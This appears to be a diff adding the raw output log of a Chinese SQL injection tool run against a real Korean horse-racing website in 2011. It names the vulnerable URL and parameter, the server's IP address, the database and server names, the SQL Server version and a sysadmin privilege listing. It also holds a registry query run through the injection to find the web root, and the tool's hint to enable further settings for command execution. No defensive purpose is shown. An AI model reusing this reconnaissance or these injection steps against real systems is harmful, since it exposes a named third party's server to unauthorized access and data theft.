@@ -1,0 +1,106 @@
+■漏洞信息:============================================================
+ ·URL:http://www.korearace.com/material/raceCard.asp?raceRegion=1
+ ·页面标题：SMART KOREARACE
+ ·参数:raceRegion=1
+ ·方法:GET
+ ·类型:String
+ ·利用方法:And
+ ·脚本语言:asp
+ ·IP:61.100.187.106
+ ·数据库:SQL Server
+ ·HEAD:
+HTTP/1.1 200 OK
+Connection: close
+Date: Mon, 04 Apr 2011 12:22:53 GMT
+Server: Microsoft-IIS/6.0
+Pragma: no-cache
+Cache-Control: no-cache, must-revalidate
+Pragma: no-cache
+Cache-Control: no-cache, must-revalidate
+Content-Length: 200245
+Content-Type: text/html
+Expires: Mon, 04 Apr 2011 12:22:53 GMT
+Set-Cookie: ASPSESSIONIDAACRTBRB=GLPCGBEAMJJOALMKIICJCNMC; path=/
+Cache-control: private
+
+
+
+■数据库信息:============================================================
+- 数据库名：KorearaceData
+- 用户名：dbo
+- 版本：Microsoft SQL Server 2005 - 9.00.1399.06 (Intel X86) 
+	Oct 14 2005 00:33:37 
+	Copyright (c) 1988-2005 Microsoft Corporation
+	Enterprise Edition on Windows NT 5.2 (Build 3790: Service Pack 2)
+
+- 服务器名：KR_DA1
+- 服务名：MSSQLSERVER
+- 系统用户名：#korearace#
+
+■发现SQL2005，建议您先切换到 '杂项工具' 标签页面开启相关设置。
+ ·当前用户权限：
+sysadmin(sa): 1
+dbcreator): 1
+bulkadmin: 1
+diskadmin: 1
+serveradmin: 1
+public: 1
+db_owner: 1
+db_backupoperator: 1
+db_datawriter: 1
+
+ ·数据库信息:
+db_name	filename
+----------------------------------------------------------------------------------------------------
+取记录数失败，使用设定值：5
+
+ ·SQL Server用户名列表：
+用户名		角色		安全编号
+----------------------------------------------------------------------------------------------------
+取记录数失败，使用设定值：5
+
+ ·数据库相关进程信息:
+程序名	状态	主机名	主机进程ID	命令行	NT用户名
+----------------------------------------------------------------------------------------------------
+取记录数失败，使用设定值：5
+
+ ·链接的服务器信息:
+服务器名	服务器产品	提供者名	数据源	位置	服务器网络名
+----------------------------------------------------------------------------------------------------
+取记录数失败，使用设定值：5
+
+ ·数据库用户登录信息：
+用户名	密码HASH	数据库编号	语言	时间1	时间2
+----------------------------------------------------------------------------------------------------
+取记录数失败，使用设定值：5
+■reg query "HKLM\SYSTEM\ControlSet001\Services\W3SVC\Parameters\Virtual Roots" /V "/"
+取记录数失败，使用设定值：5
+
+■数据库信息:============================================================
+- 数据库名：KorearaceData
+- 用户名：dbo
+- 版本：Microsoft SQL Server 2005 - 9.00.1399.06 (Intel X86) 
+	Oct 14 2005 00:33:37 
+	Copyright (c) 1988-2005 Microsoft Corporation
+	Enterprise Edition on Windows NT 5.2 (Build 3790: Service Pack 2)
+
+- 服务器名：KR_DA1
+- 服务名：MSSQLSERVER
+- 系统用户名：#korearace#
+
+■发现SQL2005，建议您先切换到 '杂项工具' 标签页面开启相关设置。
+ ·当前用户权限：
+sysadmin(sa): 1
+dbcreator): 1
+bulkadmin: 1
+diskadmin: 1
+serveradmin: 1
+public: 1
+db_owner: 1
+db_backupoperator: 1
+db_datawriter: 1
+
+ ·数据库信息:
+db_name	filename
+----------------------------------------------------------------------------------------------------
+取记录数失败，使用设定值：5
